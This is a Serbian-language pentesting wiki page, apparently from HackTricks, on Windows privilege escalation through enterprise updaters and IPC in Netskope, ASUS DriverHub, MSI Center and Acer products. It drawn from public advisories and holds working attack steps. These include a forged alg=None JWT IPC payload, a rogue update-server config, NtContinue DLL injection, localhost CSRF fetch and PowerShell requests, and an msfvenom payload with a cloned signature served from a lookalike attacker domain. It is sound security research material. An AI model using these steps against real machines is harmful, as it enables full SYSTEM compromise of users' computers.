# Zloupotreba enterprise auto-updaters i privilegovanog IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica generalizuje klasu Windows local privilege escalation lanaca pronađenih u enterprise endpoint agentima i updaterima koji izlažu low\-friction IPC surface i privilegovan update flow. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde low\-privileged user može prinuditi enrollment na attacker\-controlled server i zatim isporučiti maliciozan MSI koji SYSTEM servis instalira.

Ključne ideje koje možete ponovo iskoristiti protiv sličnih proizvoda:
- Iskoristite localhost IPC privilegovanog servisa da prisilite re\-enrollment ili rekonfiguraciju na server pod kontrolom napadača.
- Implementirajte vendor-ove update endpoints, isporučite rogue Trusted Root CA i usmerite updater na maliciozan, „signed“ paket.
- Izbegnite slabe signer provere (CN allow\-lists), opcionе digest flagove i labave MSI osobine.
- Ako je IPC „encrypted“, izvedite key/IV iz world\-readable machine identifiers koji su pohranjeni u registry-ju.
- Ako servis ograničava pozivaoce po image path/process name, inject-ujte u allow\-listed process ili spawn-ujte jedan suspended i bootstrap-ujte svoj DLL putem minimalnog thread\-context patch-a.

---
## 1) Prisiljavanje enrolovanja na server napadača putem localhost IPC

Mnogi agenti dolaze sa user\-mode UI process-om koji komunicira sa SYSTEM servisom preko localhost TCP koristeći JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok exploita:
1) Kreirajte JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristite alg=None tako da nije potreban potpis.
2) Pošaljite IPC poruku koja poziva provisioning komandu sa vašim JWT-om i imenom tenant-a:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da šalje zahteve vašem rogue serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako je caller verification path/name\-based, pošaljite zahtev iz allow\-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Kada client uspostavi vezu sa vašim serverom, implementirajte očekivane endpoints i usmerite ga na attacker MSI. Tipičan sled:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vraća PEM CA sertifikat. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Dostavite metadata koja upućuje na maliciozni MSI i lažnu verziju.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: servis može proveravati samo da li je Subject CN jednak “netSkope Inc” ili “Netskope, Inc.”. Vaš rogue CA može izdati leaf sa tim CN i potpisati MSI.
- CERT_DIGEST property: uključite benignu MSI property pod imenom CERT_DIGEST. Nema enforcement-a pri instalaciji.
- Optional digest enforcement: config flag (npr. check_msi_digest=false) onemogućava dodatnu kriptografsku validaciju.

Result: SYSTEM servis instalira vaš MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava proizvoljan kod kao NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope je umotao IPC JSON u polje encryptData koje izgleda kao Base64. Reversing je pokazao AES sa key/IV izvedenim iz vrednosti u registry-ju čitljivih za bilo kog korisnika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu reprodukovati enkripciju i poslati validne šifrovane komande iz standardnog korisnika. Opšti savet: ako agent odjednom “encrypts” svoj IPC, tražite device IDs, product GUIDs, install IDs pod HKLM kao materijal.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Neki servisi pokušavaju da autentifikuju peer tako što rešavaju PID TCP konekcije i upoređuju image path/name sa allow\-listed vendor binaries lociranim pod Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična zaobilaženja:
- DLL injection u allow\-listed proces (npr. nsdiag.exe) i proksi IPC iznutra.
- Spawn-ujte allow\-listed binary suspended i bootstrap-ujte svoj proxy DLL bez CreateRemoteThread (see §5) da biste zadovoljili driver\-enforced tamper rules.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Proizvodi često isporučuju minifilter/OB callbacks driver (npr. Stadrv) da uklone opasna prava sa handle-ova za zaštićene procese:
- Proces: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user\-mode loader koji poštuje ova ograničenja:
1) CreateProcess vendor binary sa CREATE_SUSPENDED.
2) Dobavite handle-ove koje vam je još uvek dozvoljeno imati: PROCESS_VM_WRITE | PROCESS_VM_OPERATION na procesu, i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patch-ujete kod na poznatoj RIP).
3) Prepišite ntdll!NtContinue (ili drugi rani, guaranteed\-mapped thunk) malim stubom koji poziva LoadLibraryW na putanji vašeg DLL-a, pa se vraća.
4) ResumeThread da okine vaš stub in\-process, učitavajući vaš DLL.

Pošto nikada niste koristili PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME na već zaštićenom procesu (vi ste ga kreirali), pravila drajvera su zadovoljena.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje malicioznog MSI-a i servira potrebne endpoint-e: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope je custom IPC client koji gradi proizvoljne (opciono AES\-encrypted) IPC poruke i uključuje suspended\-process injection da potekne od allow\-listed binarnog fajla.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub isporučuje user\-mode HTTP servis (ADU.exe) na 127.0.0.1:53000 koji očekuje browser pozive sa https://driverhub.asus.com. Origin filter jednostavno izvršava `string_contains(".asus.com")` nad Origin header-om i nad download URL-ovima iz `/asus/v1.0/*`. Bilo koji attacker\-controlled host kao `https://driverhub.asus.com.attacker.tld` stoga prolazi proveru i može slati state\-changing requests iz JavaScript-a. Pogledajte [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne obrasce zaobilaženja.

Praktični tok:
1) Registrujte domen koji sadrži `.asus.com` i hostujte malicioznu veb-stranu tamo.
2) Koristite `fetch` ili XHR da pozovete privilegovani endpoint (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON telo koje handler očekuje – packed frontend JS prikazuje šemu ispod.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Čak i PowerShell CLI prikazan ispod uspeva kada je Origin header spoofed na pouzdanu vrednost:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne fajlove definisane u JSON telu i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Validacija Download URL-a ponovo koristi istu substring logiku, tako da `http://updates.asus.com.attacker.tld:8000/payload.exe` bude prihvaćen. Posle preuzimanja, ADU.exe samo proverava da li PE sadrži potpis i da li Subject string odgovara ASUS pre nego što ga pokrene – nema `WinVerifyTrust`, nema verifikacije lanca.

Da bi se iskoristio tok:
1) Kreirajte payload (npr., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS-ov signer u njega (npr., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na .asus.com lookalike domenu i pokrenite UpdateApp preko browser CSRF-a iznad.

Pošto su i Origin i URL filteri substring\-based i provera signera samo poredi stringove, DriverHub povlači i izvršava napadačev binarni fajl u svom povišenom kontekstu.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center-ova SYSTEM servis izlaže TCP protokol gde je svaki frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core komponenta (Component ID `0f 27 00 00`) nosi `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njegov handler:
1) Kopira dostavljeni izvršni fajl u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifikuje potpis preko `CS_CommonAPI.EX_CA::Verify` (certificate subject mora biti “MICRO-STAR INTERNATIONAL CO., LTD.” i `WinVerifyTrust` mora uspeti).
3) Kreira scheduled task koji pokreće temp fajl kao SYSTEM sa argumentima koje kontroliše napadač.

Kopirani fajl nije zaključan između verifikacije i `ExecuteTask()`. Napadač može:
- Poslati Frame A koji pokazuje na legitimni MSI-potpisani binarni fajl (garantuje da provera potpisa prođe i da se task stavi u red).
- Trkati se sa ponavljanim Frame B porukama koje pokazuju na maliciozni payload, prepisujući `MSI Center SDK.exe` odmah nakon završetka verifikacije.

Kada scheduler pokrene zadatak, izvršiće prepisani payload kao SYSTEM uprkos tome što je originalni fajl bio verifikovan. Pouzdana eksploatacija koristi dve gorutine/threads koje spam-uju CMD_AutoUpdateSDK dok se TOCTOU prozor ne osvoji.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Svaki plugin/DLL koji učita `MSI.CentralServer.exe` dobija Component ID koji se čuva pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta frame-a selektuju tu komponentu, omogućavajući napadačima da usmere komande na proizvoljne module.
- Plugin-i mogu definisati sopstvene task runnere. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` sa **bez verifikacije potpisa** – bilo koji lokalni korisnik može da ga usmeri na `C:\Users\<user>\Desktop\payload.exe` i deterministički dobije SYSTEM izvršenje.
- Sniffing loopback-a sa Wireshark-om ili instrumentacija .NET binarnih fajlova u dnSpy brzo otkriva Component ↔ command mapiranje; custom Go/ Python klijenti zatim mogu da replay-uju frame-ove.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, a njegova discretionary ACL dozvoljava udaljenim klijentima (npr., `\\TARGET\pipe\treadstone_service_LightMode`) pristup. Slanje command ID `7` sa putanjom fajla izaziva rutinu servisa za spawn-ovanje procesa.
- Klijentska biblioteka serializuje magic terminator bajt (113) zajedno sa arg-ovima. Dinamička instrumentacija sa Frida/`TsDotNetLib` (pogledajte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) za savete o instrumentaciji) pokazuje da native handler mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i integrity SID pre nego što pozove `CreateProcessAsUser`.
- Zamena 113 (`0x71`) za 114 (`0x72`) ulazi u generičku granu koja zadržava kompletan SYSTEM token i postavlja high-integrity SID (`S-1-16-12288`). Spawn-ovani binarni fajl zato radi kao neograničeni SYSTEM, kako lokalno tako i cross-machine.
- Kombinujte to sa izloženim installer flagom (`Setup.exe -nocheck`) da podignete ACC čak i na lab VM-ovima i vežbate pipe bez vendor hardvera.

Ovi IPC bagovi naglašavaju zašto localhost servisi moraju da sprovode mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) i zašto helper svakog modula za „run arbitrary binary” mora da koristi iste provere signera.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
